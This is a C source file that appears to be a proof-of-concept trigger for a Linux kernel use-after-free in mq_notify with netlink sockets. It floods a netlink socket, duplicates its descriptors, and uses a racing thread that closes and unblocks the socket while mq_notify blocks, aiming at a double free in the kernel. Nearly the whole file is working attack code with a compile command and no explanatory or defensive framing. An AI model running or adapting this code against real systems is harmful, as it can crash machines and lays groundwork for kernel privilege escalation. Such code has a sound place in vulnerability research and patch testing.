//gcc poc.c -lpthread -o poc
#define _GNU_SOURCE
#include <asm/types.h>
#include <mqueue.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <pthread.h>
#include <errno.h>
#include <stdbool.h>



#define SOL_NETLINK (270)
#define NOTIFY_COOKIE_LEN (32)
#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(fd,  level,  optname, optval, optlen) syscall(__NR_setsockopt, fd,  level,  optname, optval, optlen)
#define _dup(fd) syscall(__NR_dup,fd)
#define _close(fd) syscall(__NR_close,fd)
#define _bind(recv_fd,addr,len) syscall(__NR_bind,recv_fd,addr,len)
#define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)


int block()
{
    char iov_base[1024*10];
    int send_fd = -1;
    int recv_fd = -1;
    int new_size = 0;
    struct iovec iov = {
        .iov_base = iov_base,
        .iov_len = sizeof(iov_base)
    };
    struct sockaddr_nl addr = {
        .nl_family = AF_NETLINK,
        .nl_pid = 10,
        .nl_groups = 0,
        .nl_pad = 0
    };
    struct msghdr msg = {
        .msg_name = &addr,
        .msg_namelen = sizeof(addr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = NULL,
        .msg_controllen = 0,
        .msg_flags = 0, 
    };
    if ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0 ||
        (recv_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK)) < 0)
    {
        perror("init sock");
        exit(-3);
    }
    printf("socket created (send_fd = %d, recv_fd = %d)\n", send_fd, recv_fd);

    while(_bind(recv_fd,(struct sockaddr*)&addr,sizeof(addr)))
    {
        if (errno != EADDRINUSE)
        {
            perror("bind");
        }
        addr.nl_pid++;
    }
    printf("netlink socket bound (nl_pid=%d)\n", addr.nl_pid);
    if (_setsockopt(recv_fd, SOL_SOCKET, SO_RCVBUF, &new_size, sizeof(new_size)))
        perror("setsockopt");
    else
        printf("receive buffer reduced\n");
    printf("start to flooding socket\n");
    while (_sendmsg(send_fd, &msg, MSG_DONTWAIT)>0) ;
    if (errno != EAGAIN)
    {
        perror("sendmsg");
        exit(-5);
    }
    printf("flood completed\n");
    _close(send_fd);
    _close(send_fd);
    return recv_fd;
}

struct unblock_thread_arg {
    int fd;
    int unblock_fd;
    bool ok;
};

static void *unblock_thread(struct unblock_thread_arg *arg)
{
    int optlen = sizeof(int);
    int optval = 0x6666;
    //very magical here,while using 0x666 is invalid
    arg->ok = true;
    sleep(5);
    printf("close sock_fd:%d\n",arg->fd);
    _close(arg->fd);
    printf("close sock_fd succeed\n");
    printf("start to unblock\n");
    if(_setsockopt(arg->unblock_fd,  SOL_NETLINK,  NETLINK_NO_ENOBUFS, &optval, sizeof(int)))
        perror("setsockopt error");
    puts("unblocked");
    return NULL;
}

static int triger(int fd,int unblock_fd)
{
    struct unblock_thread_arg arg;
    struct sigevent sigv;
    memset(&sigv,0,sizeof(sigv));
    memset(&arg,0,sizeof(arg));
    pthread_t tid;
    char user_buf[NOTIFY_COOKIE_LEN];
    arg.ok = false;
    arg.fd = fd;
    arg.unblock_fd = unblock_fd;
    if(errno = pthread_create(&tid,NULL,unblock_thread,&arg))
    {
        perror("unblock thread create error");
        return -1;
    }
    printf("unblock thread created succeed\n");
    while(arg.ok == false);
    printf("sock_fd:%d,unblock_fd:%d\n",fd,unblock_fd);
    sigv.sigev_signo = fd;
    sigv.sigev_notify = SIGEV_THREAD;
    sigv.sigev_value.sival_ptr = user_buf;
    _mq_notify((mqd_t)-1,&sigv);
}

int main()
{

    int sock_fd=0;
    int sock_fd2=0;
    int unblock_fd=0;

    if ((sock_fd = block()) < 0)
    {
        perror("sock_fd");
        return -1;
    }
    printf("%d\n",sock_fd);
    printf("start to dup\n");
    sock_fd2=_dup(sock_fd);
    unblock_fd=_dup(sock_fd);
    printf("sock_fd2:%d,unblock_fd:%d\n",sock_fd2,unblock_fd);
    printf("dup succeed\n");
    triger(sock_fd,unblock_fd);
    triger(sock_fd2,unblock_fd);

    return 0;
}